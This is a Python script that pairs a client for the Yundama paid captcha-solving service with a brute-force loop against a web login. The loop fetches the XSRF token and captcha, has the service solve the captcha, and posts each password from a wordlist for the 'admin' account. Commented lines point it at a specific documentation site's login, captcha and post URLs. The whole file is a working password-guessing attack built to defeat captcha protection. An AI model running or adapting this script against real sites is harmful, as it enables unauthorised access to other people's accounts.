import http.client, mimetypes, urllib, json, time, requests
import requests,base64
import sys
sys.path.insert(0,'.')
from config import config

class YDMHttp:

    apiurl = config.apiurl
    username = ''
    password = ''
    appid = ''
    appkey = ''

    def __init__(self, username, password, appid, appkey):
        self.username = username
        self.password = password
        self.appid = str(appid)
        self.appkey = appkey

    def request(self, fields, files=[]):
        response = self.post_url(self.apiurl, fields, files)
        response = json.loads(response)
        return response

    def balance(self):
        data = {'method': 'balance', 'username': self.username, 'password': self.password, 'appid': self.appid, 'appkey': self.appkey}
        response = self.request(data)
        if (response):
            if (response['ret'] and response['ret'] < 0):
                return response['ret']
            else:
                return response['balance']
        else:
            return -9001

    def login(self):
        data = {'method': 'login', 'username': self.username, 'password': self.password, 'appid': self.appid, 'appkey': self.appkey}
        response = self.request(data)
        if (response):
            if (response['ret'] and response['ret'] < 0):
                return response['ret']
            else:
                return response['uid']
        else:
            return -9001

    def upload(self, filename, codetype, timeout):
        data = {'method': 'upload', 'username': self.username, 'password': self.password, 'appid': self.appid, 'appkey': self.appkey, 'codetype': str(codetype), 'timeout': str(timeout)}
        file = {'file': filename}
        response = self.request(data, file)
        if (response):
            if (response['ret'] and response['ret'] < 0):
                return response['ret']
            else:
                return response['cid']
        else:
            return -9001

    def result(self, cid):
        data = {'method': 'result', 'username': self.username, 'password': self.password, 'appid': self.appid, 'appkey': self.appkey, 'cid': str(cid)}
        response = self.request(data)
        return response and response['text'] or ''

    def decode(self, filename, codetype, timeout):
        cid = self.upload(filename, codetype, timeout)
        if (cid > 0):
            for i in range(0, timeout):
                result = self.result(cid)
                if (result != ''):
                    return cid, result
                else:
                    time.sleep(1)
            return -3003, ''
        else:
            return cid, ''

    def report(self, cid):
        data = {'method': 'report', 'username': self.username, 'password': self.password, 'appid': self.appid, 'appkey': self.appkey, 'cid': str(cid), 'flag': '0'}
        response = self.request(data)
        if (response):
            return response['ret']
        else:
            return -9001

    def post_url(self, url, fields, files=[]):
        for key in files:
            files[key] = open(files[key], 'rb');
        res = requests.post(url, files=files, data=fields)
        return res.text



username = config.username
password = config.password
appid = config.appid
appkey = config.appkey
filename = config.filename
codetype = config.codetype
timeout = config.timeout



def yundama(target_url,target_post,target_captcha,passf):
    yundama = YDMHttp(username, password, appid, appkey)
    uid = yundama.login();
    balance = yundama.balance();
    print('balance: %s' % balance)

    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0"})
    raw = s.get(target_url)
    xsrf = base64.b64decode(raw.cookies.values()[0].split("|")[0])

    with open(passf) as passfile:
        for passwd in passfile:
            img = s.get(target_captcha)
            with open('1.jpg', 'wb') as f:
                f.write(img.content)
            cid, result = yundama.decode(filename, codetype, timeout);
            print('cid: %s, result: %s' % (cid, result))
            print('using password:' + passwd)
            response = s.post(target_post, data={
                "_xsrf": xsrf,
                "account": "admin",
                "password": passwd,
                "code": result}).json()
            print(response['message'])

#target_url = "https://doc.iminho.me/login"
#target_post = "https://doc.iminho.me/login"
#target_captcha = "https://doc.iminho.me/captcha"
#passf = "pass.txt"
#yundama(target_url,target_post,target_captcha,passf)